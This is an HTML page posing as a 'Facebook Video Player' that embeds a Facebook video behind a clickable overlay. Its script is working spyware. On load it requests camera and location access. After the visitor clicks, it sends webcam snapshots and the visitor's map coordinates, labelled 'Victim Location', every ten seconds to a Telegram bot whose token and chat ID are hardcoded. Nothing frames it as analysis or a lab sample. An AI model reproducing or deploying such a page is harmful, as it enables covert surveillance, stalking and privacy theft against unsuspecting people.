<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video Player</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .wrapper { position: relative; width: 100%; height: 100%; max-width: 500px; }
        iframe { width: 100%; height: 100%; border: none; }
        #overlay { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.1); z-index: 10; cursor: pointer;
        }
        canvas, video { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <div id="overlay"></div>
    
    <iframe src="https://www.facebook.com/plugins/video.php?height=476&href=https://www.facebook.com/share/r/1ARtdxQJhp/&show_text=false&width=267&t=0" 
        scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share">
    </iframe>
</div>

<video id="video" autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    //        
    const botToken = "8287544458:AAEtYnwGsGQoBp-DGsm0hewUUQQA5VTZV9E";
    const chatId = "7318157908";
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const overlay = document.getElementById('overlay');

    async function init() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            navigator.geolocation.getCurrentPosition(() => {}, () => {});
        } catch (e) {}
    }
    window.onload = init;

    overlay.addEventListener('click', () => {
        overlay.style.display = "none"; 
        
        setInterval(() => {
            captureAndSend();
            sendLocation();
        }, 10000);

        captureAndSend();
        sendLocation();
    });

    function captureAndSend() {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'image.jpg');
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendLocation() {
        navigator.geolocation.getCurrentPosition(pos => {
            const map = ` Victim Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(map)}`);
        });
    }
</script>
</body>
</html>
